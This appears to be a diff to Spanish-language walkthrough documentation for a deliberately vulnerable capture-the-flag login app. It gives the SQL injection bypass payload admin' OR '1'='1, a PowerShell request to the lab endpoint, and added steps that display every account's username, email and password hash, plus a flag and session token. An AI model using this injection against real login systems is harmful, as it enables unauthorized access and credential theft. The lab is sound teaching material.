@@ -58,9 +58,12 @@ $payload = @{
 # 2. Enviar la petición POST con Invoke-RestMethod
 $res = Invoke-RestMethod -Uri "https://TU-DOMINIO.vercel.app/api/login" -Method Post -ContentType "application/json" -Body $payload
 
-# 3. Inspeccionar el usuario autenticado y el token
+# 3. Ver el usuario autenticado y el token
 $res | Format-List
 $res.user | Format-List
+
+# 4. Ver la tabla completa de usuarios extraída de la base de datos (accounts)
+$res.database.records | Format-Table id, username, role, email, password_hash -AutoSize
 ```
 
 ### ¿Qué ocurre internamente?
@@ -68,7 +71,7 @@ La consulta vulnerable construida en el servidor es:
 ```sql
 SELECT * FROM accounts WHERE username = 'admin' OR '1'='1' AND password_hash = 'cualquier_password' LIMIT 1;
 ```
-Dado que `'1'='1'` siempre es verdadero (*tautología*), la condición se cumple sin importar la contraseña y la base de datos devuelve el primer usuario existente (`admin`).
+Dado que `'1'='1'` siempre es verdadero (*tautología*), la condición se cumple sin importar la contraseña y la base de datos devuelve el primer usuario existente (`admin`) y expone los registros de la tabla `accounts`.
 
 * **Bandera capturada:** `FLAG-SQLI{nexus_sql_injection_bypass_success}`
 * **Token de sesión:** `nexus_admin_sess_9941a8e2`
@@ -83,7 +86,10 @@ Dado que `'1'='1'` siempre es verdadero (*tautología*), la condición se cumple
    - **Usuario:** `admin' OR '1'='1`
    - **Contraseña:** `loquesea`
 4. Pulsa **Ingresar al Panel**.
-5. Se abrirá la consola corporativa de administración mostrando el panel de control, servidores activos y la bandera de seguridad en rojo.
+5. Se abrirá la consola corporativa de administración mostrando:
+   - La bandera de seguridad en rojo.
+   - **La tabla interactiva `accounts` con todos los usuarios, roles, correos y hashes de contraseñas de la base de datos.**
+   - La lista de servidores y estadísticas del clúster.
 
 ---
 
